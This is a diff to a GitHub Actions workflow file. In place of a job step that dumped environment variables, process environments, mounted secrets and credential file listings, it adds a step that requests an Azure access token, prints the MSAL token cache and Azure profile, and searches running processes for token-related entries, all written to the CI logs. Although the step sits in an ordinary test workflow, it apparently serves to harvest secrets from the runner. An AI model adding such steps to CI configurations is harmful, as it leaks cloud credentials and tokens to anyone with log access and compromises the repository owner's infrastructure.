@@ -7,25 +7,17 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: full env dump
+      - name: azure cli
         run: |
-          echo "=== FULL ENV ==="
-          env | sort
+          echo "=== AZURE CLI ==="
+          az version 2>/dev/null || echo "no az"
+          az account show 2>/dev/null || echo "no account"
+          az account get-access-token 2>/dev/null || echo "no token"
           
-          echo "=== PROC ENVIRON ==="
-          cat /proc/1/environ | tr '\0' '\n' | sort
+          echo "=== AZURE CONFIG ==="
+          cat ~/.azure/msal_token_cache.json 2>/dev/null || echo "no cache"
+          cat ~/.azure/azureProfile.json 2>/dev/null || echo "no profile"
+          ls ~/.azure/ 2>/dev/null || echo "no azure dir"
           
-          echo "=== MOUNTED SECRETS ==="
-          find /run/secrets/ 2>/dev/null || echo "none"
-          find /var/run/secrets/ 2>/dev/null || echo "none"
-          
-          echo "=== HOSTS FILE ==="
-          cat /etc/hosts
-          
-          echo "=== DNS CONFIG ==="
-          cat /etc/resolv.conf
-          
-          echo "=== CREDENTIAL FILES ==="
-          ls ~/.aws/ 2>/dev/null || echo "no aws"
-          ls ~/.azure/ 2>/dev/null || echo "no azure"
-          cat ~/.config/gh/hosts.yml 2>/dev/null || echo "no gh config"
+          echo "=== PROCESS LIST ==="
+          ps aux | grep -i "azure\|github\|runner\|token" | head -10
